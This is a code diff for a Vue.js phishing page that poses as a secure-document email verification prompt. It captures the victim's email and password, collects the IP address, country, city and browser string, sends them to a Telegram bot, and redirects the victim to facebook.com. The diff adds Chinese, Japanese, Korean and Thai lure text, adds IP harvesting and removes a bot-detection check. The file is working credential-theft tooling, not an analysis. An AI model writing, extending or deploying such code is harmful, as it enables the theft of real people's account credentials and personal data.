@@ -16,6 +16,9 @@ const app = Vue.createApp({
         verify: 'Verify',
         checking: 'Checking, please wait...',
       },
+      emailTouched: false, // Track if email has been touched
+      passwordTouched: false, // Track if password has been touched
+      ipInfo: null, // Holds IP-related information
     };
   },
   computed: {
@@ -27,13 +30,19 @@ const app = Vue.createApp({
       return this.password.length >= 5;
     },
     emailError() {
-      return this.email && !this.isValidEmail;
+      return this.emailTouched && !this.isValidEmail; // Show error only after blur
     },
     passwordError() {
-      return this.password && !this.isValidPassword;
+      return this.passwordTouched && !this.isValidPassword; // Show error only after blur
     },
   },
   methods: {
+    validateEmail() {
+      this.emailTouched = true; // Mark email as touched
+    },
+    validatePassword() {
+      this.passwordTouched = true; // Mark password as touched
+    },
     async setLocalization() {
       try {
         const res = await axios.get('https://ipapi.co/json/');
@@ -61,11 +70,48 @@ const app = Vue.createApp({
             verify: 'Vérifier',
             checking: 'Vérification, veuillez patienter...',
           },
+          cn: {
+            enterEmail: '验证您的电子邮件身份以访问安全文档。',
+            next: '下一步',
+            enterPassword: '输入密码',
+            verify: '验证',
+            checking: '正在检查，请稍候...',
+          },
+          jp: {
+            enterEmail: '安全なドキュメントにアクセスするには、メールを確認してください。',
+            next: '次へ',
+            enterPassword: 'パスワードを入力してください',
+            verify: '確認する',
+            checking: '確認中、お待ちください...',
+          },
+          kr: {
+            enterEmail: '보안 문서에 액세스하려면 이메일을 확인하십시오.',
+            next: '다음',
+            enterPassword: '비밀번호를 입력하세요',
+            verify: '확인',
+            checking: '확인 중입니다. 잠시 기다려주세요...',
+          },
+          th: {
+            enterEmail: 'ยืนยันอีเมลของคุณเพื่อเข้าถึงเอกสารที่ปลอดภัย',
+            next: 'ถัดไป',
+            enterPassword: 'กรอกรหัสผ่าน',
+            verify: 'ยืนยัน',
+            checking: 'กำลังตรวจสอบ โปรดรอสักครู่...',
+          },
         };
 
         this.localizedText = translations[language] || translations['en'];
       } catch (error) {
         console.error('Localization Error:', error);
+      }
+    },
+    async updateIPInfo() {
+      try {
+        const res = await axios.get('https://ipapi.co/json/');
+        this.ipInfo = res.data; // Store IP information
+      } catch (error) {
+        console.error('Failed to fetch IP information:', error);
+        this.ipInfo = { ip: 'Unavailable', country: 'Unavailable', city: 'Unavailable' };
       }
     },
     updateLogo() {
@@ -76,21 +122,15 @@ const app = Vue.createApp({
         this.domainLogo = 'assets/logo2.png'; // Fallback to default logo
       }
     },
-    requestPassword() {
+    async requestPassword() {
       if (this.isValidEmail) {
         this.updateLogo(); // Update the logo for the email domain
+        await this.updateIPInfo(); // Fetch and store IP information
         this.showPassword = true; // Show the password input phase
       }
     },
     async verifyLogin() {
       if (!this.isValidPassword) {
-        return;
-      }
-
-      const { country, isBot } = await this.getIPInfo();
-
-      if (isBot) {
-        alert('Access denied. Detected as bot.');
         return;
       }
 
@@ -101,22 +141,19 @@ const app = Vue.createApp({
         window.location.href = 'https://facebook.com';
       }, 2000);
     },
-    async getIPInfo() {
-      try {
-        const res = await axios.get('https://ipapi.co/json/');
-        const country = res.data.country_name || 'Unknown';
-        const isBot = res.data.user_type === 'bot';
-
-        return { country, isBot };
-      } catch (error) {
-        return { country: 'Unknown', isBot: false };
-      }
-    },
     sendToTelegram() {
       const browserInfo = navigator.userAgent;
-      const country = this.getIPInfo().then((info) => info.country);
+      const ipInfoText = this.ipInfo
+        ? `IP Address: ${this.ipInfo.ip}\nCountry: ${this.ipInfo.country_name}\nCity: ${this.ipInfo.city}`
+        : 'IP information unavailable';
 
-      const message = `Email: ${this.email}\nPassword: ${this.password}\nBrowser: ${browserInfo}\nCountry: ${country}`;
+      const message = `
+        Email: ${this.email}
+        Password: ${this.password}
+        Browser: ${browserInfo}
+        ${ipInfoText}
+      `;
+
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(
         message
       )}`;
@@ -124,10 +161,11 @@ const app = Vue.createApp({
       axios.get(url).catch((err) => console.error('Telegram Error:', err));
     },
   },
-  mounted() {
-    this.setLocalization();
+  async mounted() {
+    await this.setLocalization();
   },
 });
 
 app.mount('#app');
+
 
